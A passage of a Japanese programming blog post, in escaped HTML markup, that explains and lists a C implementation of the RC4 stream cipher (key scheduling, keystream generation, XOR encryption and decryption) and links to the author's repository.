    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;上記のコードの通り、入力されたキーを元にKSAで初期ストリームを生成します。&lt;/p&gt;
&lt;h3 id=&quot;prgaで鍵ストリームを生成して暗号化&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#prga%E3%81%A7%E9%8D%B5%E3%82%B9%E3%83%88%E3%83%AA%E3%83%BC%E3%83%A0%E3%82%92%E7%94%9F%E6%88%90%E3%81%97%E3%81%A6%E6%9A%97%E5%8F%B7%E5%8C%96&quot; aria-label=&quot;prgaで鍵ストリームを生成して暗号化 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;PRGAで鍵ストリームを生成して暗号化&lt;/h3&gt;
&lt;p&gt;RC4のPRGAから暗号化までは以下のステップで実装します。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;iをインクリメントする(&lt;code class=&quot;language-text&quot;&gt;i = (i + 1) % 256&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;S[i]をjを加算する(&lt;code class=&quot;language-text&quot;&gt;j = (j + S[i]) % 256&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;S[i]とS[j]をスワップする&lt;/li&gt;
&lt;li&gt;鍵ストリームKを&lt;code class=&quot;language-text&quot;&gt;S[(S[i] + S[j]) % 256]&lt;/code&gt;として平文とXORをとる&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;実装は非常にシンプルですね。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;PRGA&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;S&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;text&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;encrypted_text&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;

    &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; i &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; j &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;size_t&lt;/span&gt; n &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; len &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;text&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; n &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; len&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; n&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
        i &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;i &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt; N&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        j &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;j &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; S&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;i&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt; N&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token function&quot;&gt;swap&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;S&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;i&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;S&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;j&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; K &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; S&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;S&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;i&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; S&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;j&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt; N&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        encrypted_text&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;n&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; K &lt;span class=&quot;token operator&quot;&gt;^&lt;/span&gt; text&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;n&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;これでRC4の暗号化処理が実装できました。&lt;/p&gt;
&lt;h3 id=&quot;復号&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E5%BE%A9%E5%8F%B7&quot; aria-label=&quot;復号 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;復号&lt;/h3&gt;
&lt;p&gt;RC4暗号は疑似乱数を用いたXORにより暗号化を行っています。&lt;/p&gt;
&lt;p&gt;この疑似乱数の生成アルゴリズムは決定論的アルゴリズムなので、常に同じキーから同じ疑似乱数が取得できます。&lt;/p&gt;
&lt;p&gt;そのため、RC4の暗号化に使用したものと同じキーを使用して生成した疑似乱数で、暗号化されたテキストを再びXORすることで元の平文を復号することができます。&lt;/p&gt;
&lt;h2 id=&quot;ソースコード&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%BD%E3%83%BC%E3%82%B9%E3%82%B3%E3%83%BC%E3%83%89&quot; aria-label=&quot;ソースコード permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;ソースコード&lt;/h2&gt;
&lt;p&gt;ソースコード全体は以下です。&lt;/p&gt;
&lt;p&gt;こちらのリポジトリにも置いてあります。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://github.com/kash1064/Try2WinDbg/blob/master/build/c/rc4_encrypt.c&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Try2WinDbg/rc4_encrypt.c&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&amp;lt;stdio.h&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&amp;lt;string.h&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&amp;lt;stdlib.h&gt;&lt;/span&gt;&lt;/span&gt;

&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;N&lt;/span&gt; &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token number&quot;&gt;256&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;swap&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;a&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;b&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; tmp &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;a&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;a &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;b&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;b &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; tmp&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;KSA&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;key&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;S&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;

    &lt;span class=&quot;token comment&quot;&gt;// 配列Sの初期化(S[0]=0, S[1]=1....S[255]=255)&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; i &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; i &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; N&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; i&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; S&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;i&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; i&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    
    &lt;span class=&quot;token comment&quot;&gt;// KSAで初期ストリームを生成&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; j &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; len &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;key&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; i &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; i &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; N&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; i&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
        j &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;j &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; S&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;i&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; key&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;i &lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt; len&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt; N&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token function&quot;&gt;swap&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;S&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;i&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;S&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;j&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;PRGA&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;S&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;text&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;encrypted_text&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;

    &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; i &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; j &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;size_t&lt;/span&gt; n &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; len &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;text&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; n &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; len&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; n&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
        i &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;i &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt; N&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        j &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;j &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; S&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;i&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt; N&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token function&quot;&gt;swap&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;S&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;i&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;S&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;j&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; K &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; S&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;S&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;i&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; S&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;j&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt; N&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        encrypted_text&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;n&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; K &lt;span class=&quot;token operator&quot;&gt;^&lt;/span&gt; text&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;n&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;RC4&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;key&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;text&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;encrypted_text&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;

    &lt;span class=&quot;token keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; S&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;N&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;token function&quot;&gt;KSA&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;key&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; S&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;PRGA&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;S&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; text&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; encrypted_text&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
